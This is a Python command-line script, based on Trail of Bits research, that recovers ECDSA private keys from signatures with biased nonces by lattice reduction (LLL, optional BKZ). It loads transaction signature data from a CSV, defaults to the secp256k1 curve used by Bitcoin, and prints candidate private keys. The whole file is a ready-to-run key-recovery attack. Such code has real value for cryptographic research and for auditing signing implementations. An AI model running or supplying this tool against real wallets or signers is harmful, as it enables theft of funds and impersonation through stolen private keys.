#!/usr/bin/env python
# Author Dario Clavijo 2020
# based on previous work:
# https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/
# https://www.youtube.com/watch?v=6ssTlSSIJQE

import sys
import argparse
import mmap
from fractions import Fraction
import olll
from fpylll import IntegerMatrix, BKZ
from fpylll.algorithms.bkz import BKZReduction


# Default order from secp256k1 curve
DEFAULT_ORDER = 115792089237316195423570985008687907852837564279074904382605163141518161494337


def modular_inv(a, b):
    """Efficient modular inverse"""
    return pow(a, -1, b)


def load_csv(filename, limit=None, mmap_flag=False):
    """Load CSV with ECDSA data, optimized to handle file efficiently (with optional mmap)."""
    msgs, sigs, pubs = [], [], []
    
    # Open the file with mmap if requested
    if mmap_flag:
        with open(filename, 'r') as f:
            # Memory map the file for efficient access
            mapped_file = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
            lines = mapped_file.splitlines()
            for n, line in enumerate(lines):
                if limit is not None and n >= limit:
                    break
                l = line.decode('utf-8').rstrip().split(",")
                tx, R, S, Z, pub = l
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(pub)
    else:
        # Regular file reading without mmap
        with open(filename, 'r') as fp:
            for n, line in enumerate(fp):
                if limit is not None and n >= limit:
                    break
                tx, R, S, Z, pub = line.rstrip().split(",")
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(pub)
    
    return msgs, sigs, pubs


def make_matrix(msgs, sigs, pubs, B, order, matrix_type="dense"):
    """Construct matrix, either sparse or dense, based on the matrix_type parameter."""
    m = len(msgs)
    m1 = m + 1
    sys.stderr.write(f"Using: {m} sigs...\n")


    matrix = [[0] * m1 for _ in range(m-1)]        

    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
    mi_sn_order = modular_inv(sn, order)
    rnsn_inv = rn * mi_sn_order
    mnsn_inv = msgn * mi_sn_order

    r1,r2 = [],[]
    for i in range(m-1):
        # Fill diagonal with the order
        matrix[i][i] = order
        mi_sigi_order = modular_inv(sigs[i][1], order)
        # fill the last two rows
        r1.append(int(sigs[i][0]) * mi_sigi_order - rnsn_inv)
        r2.append(int(msgs[i]) * mi_sigi_order - mnsn_inv)

    # add last elements of last two rows, B = 2**(256-80)
    r1.append(Fraction(2**B, order))
    r1.append(0)
    r2.append(0)
    r2.append(2**B)

    matrix.append(r1)
    matrix.append(r2)

    return matrix


def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order):
    """Extract private keys from reduced matrix."""
    keys = []
    msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]

    for row in matrix:
        potential_nonce_diff = row[0]
        try:
            potential_priv_key = (
                (sn * msgs[0])
                - (sigs[0][1] * msgn)
                - (sigs[0][1] * sn * potential_nonce_diff)
            )
            potential_priv_key *= modular_inv(
                (rn * sigs[0][1]) - (sigs[0][0] * sn), order
            )
            key = potential_priv_key % order
            if key not in keys:
                keys.append(key)
        except Exception as e:
            sys.stderr.write(f"Error extracting key: {str(e)}\n")
    return keys


def display_keys(keys):
    """Display private keys in hexadecimal format."""
    sys.stdout.write("\n".join([f"{key:064x}" for key in keys]) + "\n")
    sys.stdout.flush()
    sys.stderr.flush()


def reduce_matrix(matrix, do_bkz=False, delta=0.75):
    #if algorithm == "BKZ":
    #
    #    sys.stderr.write("[!] BKZ not supported in olll, using LLL instead\n")
    new_matrix =  olll.reduction(matrix, delta)
    matrix = new_matrix

    if do_bkz:
        par = BKZ.Param(
            block_size=20,   # core parameter
            max_loops=8
        )
        # Run BKZ
        matrix = IntegerMatrix.from_matrix(matrix)
        bkz = BKZReduction(matrix)
        bkz(par)

    return matrix 



def main():
    """Main function to load data, perform lattice reduction, and display keys."""
    parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction")
    
    # Command line arguments
    parser.add_argument("filename", help="CSV file containing the ECDSA messages and signatures")
    parser.add_argument("B", type=int, help="Parameter B for matrix construction")
    parser.add_argument("limit", type=int, help="Limit for number of records to process")
    parser.add_argument(
        "--matrix_type", choices=["dense", "sparse"], default="dense",
        help="Type of matrix to use: 'dense' or 'sparse' (default: dense)"
    )
    parser.add_argument(
        "--order", type=int, default=DEFAULT_ORDER, 
        help="Order of the curve. Default is the secp256k1 order"
    )
    parser.add_argument(
        "--bkz", default=False, action="store_true",
        help="Do a BKZ final pass"
    )

    parser.add_argument(
        "--mmap", action="store_true", 
        help="Enable memory-mapping for the CSV file for faster processing"
    )

    # Parse arguments
    args = parser.parse_args()

    # Load messages, signatures, and public keys with optional mmap
    msgs, sigs, pubs = load_csv(args.filename, limit=args.limit, mmap_flag=args.mmap)

    # Construct matrix for lattice reduction
    matrix = make_matrix(msgs, sigs, pubs, args.B, args.order, matrix_type=args.matrix_type)

    # Perform LLL
    new_matrix = reduce_matrix(matrix, do_bkz=args.bkz)

    # Extract and display private keys
    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, new_matrix, args.order)
    display_keys(keys)


if __name__ == "__main__":
    main()
